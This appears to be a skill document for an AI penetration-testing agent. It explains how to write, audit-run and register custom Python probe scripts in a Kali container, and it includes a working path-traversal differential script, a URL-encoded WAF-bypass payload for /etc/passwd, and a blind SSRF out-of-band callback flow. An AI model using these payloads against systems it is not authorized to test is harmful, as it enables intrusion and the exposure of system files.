---
name: write-probe-script
description: Author a single-file Python probe at runtime when a target needs bespoke tooling no existing skill or typed kali verb covers — draft, run via `kali exec`, validate, then `artifact register` for reuse
origin: Vigil
---

# Write a Probe Script

> **Use when:** the hypothesis needs request/response logic that no existing skill,
> typed `vigil assess kali` verb, or off-the-shelf tool expresses cleanly — a
> multi-step differential, a parser-confusion crafter, a stateful auth dance, a
> blind-callback timing measurement, or a chained primitive. If a typed verb (or
> `--extra-args` on one) fits, use that instead; this skill is the escape hatch for
> *logic*, not for tools the typed surface already models. Always paired with
> `agent/skills/kali-exec/SKILL.md` (the probe runs through `vigil assess kali exec`)
> and `agent/shared-constraints.md`.

A probe is a self-contained Python file the agent writes into the engagement's
scripts dir, runs **inside the runtime container** via `vigil assess kali exec --
python3 <script>`, reads the output of, tightens, and — once it earns its keep —
registers as an artifact so the next engagement (or the next specialist this hour)
can replay it. It is the bespoke-logic sibling of the typed kali verbs: the verbs
wrap known tools; a probe encodes reasoning the tools cannot.

This is a deliberate, auditable loop, not an ad-hoc `python3 -c`. The script lives
on disk under the engagement, every run writes an audit row through the same
`kali exec` wrapper as any typed verb, and the validated script becomes a
first-class artifact linkable to the finding it proves.

## When to reach for a probe (and when not to)

Reach for a probe when **all** of these hold:

- The check needs request *logic* — branching on a prior response, diffing two
  responses, crafting a malformed body byte-by-byte, timing a blind callback, or
  walking a reference chain — not just a different flag on an existing tool.
- No skill in `vigil assess list-skills` and no typed `kali` verb (even with
  `--extra-args`) expresses it. Check first; the typed surface is broad.
- You will run it more than once, or it proves a finding and should be replayable.

Do **not** write a probe when:

- A typed verb fits. `kali httpx`, `kali ffuf`, `kali nuclei`, `kali sqlmap`, etc.
  already carry audit context, rate calibration, and output conventions. A
  one-header tweak is `--extra-args`, not a new script.
- A single `curl` answers it. Use the `kali exec -- bash -lc "curl ..."` pattern
  from `kali-exec` SKILL.md "Capture stdout/stderr to engagement-scoped paths".
- The tool exists but is not yet typed (dirb, gobuster, hydra, custom binary).
  That is raw `kali exec -- <tool>`, also covered by `kali-exec` SKILL.md — no
  Python wrapper buys you anything.

The test is "does this encode bespoke *reasoning*?" If yes, a probe earns its place.
If it is just a tool invocation, stay on the typed/exec path.

## Passive vs. active probe shapes

Match the probe shape to the `--probe-kind` you will audit it under — the shape is
not cosmetic, it is what keeps the blast radius honest.

| Shape | What it does | Typical `--probe-kind` | `--destructive`? |
|-------|--------------|------------------------|------------------|
| **Passive / fingerprint** | Reads the target: GETs, header inspection, TLS introspection, response-shape differentials with no state change. | `fingerprint` / `baseline` | no |
| **Active / payload** | Sends a crafted input testing one hypothesis (a traversal string, an injected parameter, an oversized body) and inspects the response. | `payload` | only if it writes/edits/deletes target state |
| **Blind / callback** | Fires an input that should trigger an out-of-band hit (SSRF, blind XXE, command injection) and correlates the callback. | `payload` | usually no (the *callback* is the signal, not a target write) |
| **Exploit / proof** | Demonstrates the attacker outcome (`agent/rules/hunting.md` §2) end-to-end (extracts a record, proves the IDOR boundary, chains two primitives). | `exploit` | per the actual writes performed |

A passive probe that quietly starts POSTing is mislabelled and under-audits its
risk. Pick the shape up front; if the probe grows a write, bump `--probe-kind` and
add `--destructive` on the `kali exec` call.

## Runtime API cheat-sheet

> **Drift caveat:** this cheat-sheet mirrors the real `vigil assess kali exec`
> surface defined in `agent/scripts/assess/lib/kali.py` + `kali_cli.py` and the
> `vigil oob mint` surface in the top-level CLI. It is a convenience copy, like
> reference-project's `reference-project.d.ts` is a copy of the live extension API — when the CLI
> flags change, this section must be re-synced. When in doubt, the live truth is
> `vigil assess kali exec --help`, `vigil assess contract kali exec`, and
> `vigil oob mint --help`. Do not trust a stale cheat-sheet over the CLI.

### What the runtime gives a probe

A probe is plain Python 3 executed inside the Kali runtime container. It has:

- The container's interpreter and its installed libraries — the stdlib (`urllib`,
  `ssl`, `socket`, `http.client`, `json`, `hashlib`, `time`, `argparse`) is always
  present; `requests` is available in the runtime image. Prefer the stdlib for
  zero-dependency portability so the probe replays on any runtime tier.
- The container's network position — same egress, same proxy, same isolation as
  every typed verb. A probe cannot reach anything `kali httpx` could not.
- The engagement filesystem at `/engagements/$ENGAGEMENT_KEY/...` (the bind mount).
  Read wordlists from `/engagements/$ENGAGEMENT_KEY/wordlists/`, write evidence to
  `/engagements/$ENGAGEMENT_KEY/scans/`.

It does **not** get the audit-metadata flags as variables — those live on the
*outer* `kali exec` call, not inside the script. The script just does work and
prints; the wrapper records who/why/when.

### Where the script lives

Author it on the **host** at `$ENGAGEMENT_DIR/scripts/<name>.py`. The runtime sees
the same bytes at `/engagements/$ENGAGEMENT_KEY/scripts/<name>.py` — one
bind-mounted filesystem, two names. This dual naming is the rule in
`agent/shared-constraints.md §11a`; the `scripts/` subdir under the engagement is
the canonical home for agent-authored helpers (the same place `kali-exec` SKILL.md
"Run a custom Python helper" points at). `vigil assess scaffold-probe <name>`
writes the skeleton there for you and pre-registers it (see the loop below).

### Running the probe

Run it as a raw passthrough through `kali exec`, with the full audit-flag set every
typed verb requires (see `kali-exec` SKILL.md "Audit-flag mapping"):

```bash
vigil assess kali exec \
  --technique <ENUM> --intent "<why, ≤200 chars>" \
  --probe-kind <fingerprint|baseline|payload|exploit> --phase <phase> \
  --timeout <seconds> [--destructive] -- \
  python3 /engagements/$ENGAGEMENT_KEY/scripts/<name>.py \
    --target <url> --out /engagements/$ENGAGEMENT_KEY/scans/<name>.json
```

Everything after `--` is raw argv to the in-container `python3` — that separator is
what keeps an arbitrary script auditable through the same wrapper that records
typed verbs. The wrapper writes a pre-exec audit row, streams the script's
stdout/stderr to `${ENGAGEMENT_DIR}/scans/kali/<run-id>.{out,err}`, and finalizes
the row on exit with return code, timing, and a stdout preview. Read the result
with the `stdout_path` from the emitted JSON, or have the probe write a structured
file under `scans/` and read that.

### Blind callbacks: `vigil oob mint`

For blind probes (SSRF, XXE, command injection, blind SQLi) the signal is an
out-of-band hit, not the HTTP response. Mint a nonce-tagged callback host on the
host **before** the probe runs and pass it in as an argument. `mint` binds the
nonce under a running OOB client's interactsh id and prints the full host as
`$OOB_HOST` (`<nonce>.<client-id>.oob...`) — that binding is what lets `poll`
correlate the hit, so substitute mint's output verbatim and never hand-build a
bare `<nonce>.oob...` host (full protocol in
`agent/references/offensive-tactics/frp-tunneling.md`):

```bash
# 1. Confirm OOB is healthy (a running, registered client must exist), then mint.
vigil oob status --json          # expect health=ok; degraded exits non-zero
vigil oob mint --client <your-client-name> \
  --technique ssrf --target-url https://target.example/fetch --param url
# → host  <nonce>.<client-id>.oob.example.com      ← this is $OOB_HOST
# → http  http://<nonce>.<client-id>.oob.example.com/

# 2. Pass the minted host into the probe as a parameter (do NOT hard-code it).
vigil assess kali exec \
  --technique SSRF --intent "blind SSRF via url param, oob callback" \
  --probe-kind payload --phase consume-test --timeout 120 -- \
  python3 /engagements/$ENGAGEMENT_KEY/scripts/ssrf_callback.py \
    --target https://target.example/fetch --param url \
    --callback http://$OOB_HOST/ssrf-probe

# 3. After firing, correlate the hit (nonce <-> probe) — NOT the raw client log.
vigil oob poll --client <your-client-name>   # same client you minted under
```

`vigil oob mint` flags that matter for a probe: `--client`, `--technique`,
`--target-url`, `--param`, `--probe-kind`, `--request-hash`, `--notes`, `--json`.
Mint one nonce per payload so each callback is unambiguously attributable.

### The finding-return convention

A probe's job is to produce a verdict an operator can act on, so make the verdict
machine-readable. The skeleton prints a single JSON object as its **last** line:

```json
{"finding": true, "summary": "traversal returns /etc/passwd (200, 'root:x:0:0')", "evidence": {"status": 200, "marker": "root:x:0:0"}}
```

Convention:

- `finding` (bool) — did the hypothesis hold? This is the verdict.
- `summary` (str) — one line a human reads first.
- `evidence` (object) — the load-bearing facts (status codes, response markers,
  timing deltas, callback nonce) that justify the verdict.

When `finding` is `true`, that JSON is exactly what seeds a `finding record`: the
`summary` becomes the finding title/notes line, and the evidence file under
`scans/` (plus the registered probe script itself) becomes the `evidence_ref`.
Keeping the verdict structured means the run is decidable from the audit preview
without re-reading the whole transcript.

## Worked example — parametrized HTTP path-traversal differential

Hypothesis: `GET /download?file=<x>` is vulnerable to path traversal, but the app
returns a generic 200 for both valid and invalid files, so a single request is
inconclusive. We need a **differential**: request a known-good file, request a
traversal payload, and compare. That branching logic is why this is a probe and
not a `kali ffuf` run.

**1. Scaffold the skeleton** (writes the file + pre-registers it):

```bash
vigil assess scaffold-probe traversal_diff --finding LFI-001
# wrote: scripts/traversal_diff.py   (registered, present=yes)
```

**2. Draft the logic** — edit `$ENGAGEMENT_DIR/scripts/traversal_diff.py`:

```python
#!/usr/bin/env python3
"""Differential path-traversal probe for /download?file=."""
import argparse, json, sys, urllib.request

def fetch(url):
    req = urllib.request.Request(url, headers={"User-Agent": "vigil-probe"})
    with urllib.request.urlopen(req, timeout=15) as r:  # noqa: S310 (scoped target)
        body = r.read(4096).decode("utf-8", "replace")
        return r.status, body

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True, help="base URL, e.g. https://t/download")
    ap.add_argument("--param", default="file")
    ap.add_argument("--good", default="readme.txt")
    ap.add_argument("--payload", default="../../../../etc/passwd")
    ap.add_argument("--marker", default="root:x:0:0")
    ap.add_argument("--out", default="")
    args = ap.parse_args()

    good_status, _ = fetch(f"{args.target}?{args.param}={args.good}")
    pay_status, pay_body = fetch(f"{args.target}?{args.param}={args.payload}")
    hit = pay_status == 200 and args.marker in pay_body

    result = {
        "finding": hit,
        "summary": (
            f"traversal payload returned {pay_status} with marker {args.marker!r}"
            if hit else
            f"no traversal: good={good_status} payload={pay_status} marker_absent"
        ),
        "evidence": {
            "good_status": good_status,
            "payload_status": pay_status,
            "marker": args.marker if hit else None,
        },
    }
    if args.out:
        with open(args.out, "w") as fh:
            json.dump(result, fh, indent=2)
    print(json.dumps(result))           # verdict is the LAST line
    sys.exit(0 if hit else 1)

if __name__ == "__main__":
    main()
```

**3. Run it through `kali exec`** and read the verdict:

```bash
vigil assess kali exec \
  --technique LFI --intent "differential path-traversal on /download?file" \
  --probe-kind payload --phase consume-test --timeout 60 -- \
  python3 /engagements/$ENGAGEMENT_KEY/scripts/traversal_diff.py \
    --target https://target.example/download \
    --out /engagements/$ENGAGEMENT_KEY/scans/traversal_diff.json
# stdout JSON carries stdout_path; the probe's last stdout line is the verdict.
```

**4. Tighten** — first run came back `{"finding": false, ...}` with
`payload_status: 403`. The WAF blocks the literal `../`. Edit the probe to add a
`--payload` variant (`..%2f..%2f..%2fetc%2fpasswd`) and re-run with `--force` to
suppress the dedup warning. Now `{"finding": true, ...}`.

**5. Validate** — re-run against a *known-good* control (`--payload readme.txt`
should yield `finding: false`) so the probe is not a false-positive generator. A
probe that fires on everything proves nothing.

**6. Register for reuse** (if not already pre-registered, or to refresh after
edits) and link it to the finding:

```bash
vigil assess artifact register scripts/traversal_diff.py \
  --kind probe-script --finding LFI-001
```

The validated script is now an indexed artifact: discoverable via
`vigil assess artifact search --q traversal`, replayable next engagement, and linked as
evidence on `LFI-001`.

## The iterate-and-validate loop

This is the canonical lifecycle — every probe goes through it:

1. **Scaffold** — `vigil assess scaffold-probe <name> [--finding <slug>]` writes a
   runnable skeleton to `scripts/<name>.py` and pre-registers the artifact, so it
   is linkable from the first second.
2. **Draft** — fill in the request/response logic. Keep the finding-return
   convention (JSON verdict on the last stdout line). Parametrize anything you
   might change between runs (`--target`, `--payload`, `--marker`) so tightening
   does not mean editing literals.
3. **Run** — `vigil assess kali exec -- python3 .../<name>.py ...` with the full
   audit-flag set. Output streams to `scans/kali/<run-id>.{out,err}`.
4. **Read** — inspect the verdict line and the evidence file. Did the hypothesis
   hold? Is the evidence load-bearing?
5. **Tighten** — adjust payloads/encodings/branching and re-run (`--force` to mute
   the dedup warning on intentional retries). Iterate steps 3–5 until the verdict
   is decisive.
6. **Validate against a control** — confirm the probe yields `finding: false` on a
   known-negative input. An undisciplined probe that always fires is worse than no
   probe.
7. **Register** — `vigil assess artifact register scripts/<name>.py --kind
   probe-script --finding <slug>` so it is indexed, hashed (`present=yes`), and
   linked. The scaffold pre-registers; re-register after substantive edits so the
   stored hash matches the on-disk bytes.

The loop is the point: a probe is not "write code and hope," it is draft → run →
read → tighten → **validate** → persist, with an audit row for every run and a
registered artifact at the end.

## Pitfalls

- **Hard-coding the OOB callback host.** Mint a fresh nonce per payload with
  `vigil oob mint` and pass it as an argument. A baked-in host cannot be correlated
  and pollutes the next probe's results.
- **Writing outside the engagement.** `/tmp` and `/data` inside the container are
  non-engagement paths — outputs there are invisible from the host and lost on
  restart. Always write under `/engagements/$ENGAGEMENT_KEY/scans/` (and author
  scripts under `scripts/`). Registration normalizes the path against the
  engagement root, so a file outside it cannot be registered.
- **Skipping the audit flags.** `kali exec` fails closed without `--technique`,
  `--intent`, `--probe-kind`, `--phase`, `--timeout`. There is no env-var fallback;
  pass them explicitly so the run is attributable.
- **Mislabelling the probe kind.** A probe that POSTs/PUTs/DELETEs target state is
  `--probe-kind payload`/`exploit` **and** `--destructive`. Labelling a write as
  `fingerprint` under-audits the blast radius.
- **No negative control.** A probe that returns `finding: true` for every input is
  a false-positive engine. Validate against a known-good input before trusting it.
- **Reinventing a typed verb.** If `kali httpx`/`ffuf`/`nuclei`/`sqlmap` (with
  `--extra-args`) does the job, use it — those carry rate calibration and audit
  context a hand-rolled probe does not. Probes are for *logic*, not tool re-wraps.
- **Third-party imports that may be absent.** Prefer the stdlib so the probe
  replays on any runtime tier; reach for `requests` only when the stdlib makes the
  logic genuinely worse, and never assume niche packages are installed.
- **Buffering huge responses in memory.** Read a bounded slice (`r.read(4096)`) for
  marker detection; stream large bodies to a file under `scans/` instead.

## Extended resources

- `agent/skills/kali-exec/SKILL.md` — the `vigil assess kali exec` surface this
  skill runs through (audit-flag mapping, the `--` passthrough, custom-helper and
  capture-output patterns). Load it first.
- `agent/references/probe-scripts/` — reusable, validated probe examples
  (HTTP differential, blind-callback timing) to copy and parametrize.
- `agent/references/offensive-tactics/frp-tunneling.md` — `vigil oob` / interactsh
  setup and the mint → fire → poll correlation flow for blind probes.
- `agent/skills/exploit-playbook-authoring/SKILL.md` — once a probe proves an
  exploit, the replayable proof script follows the playbook conventions.
- `agent/shared-constraints.md §11a` — the host/container path-aliasing rule that
  makes `scripts/<name>.py` and `/engagements/$ENGAGEMENT_KEY/scripts/<name>.py`
  the same bytes.
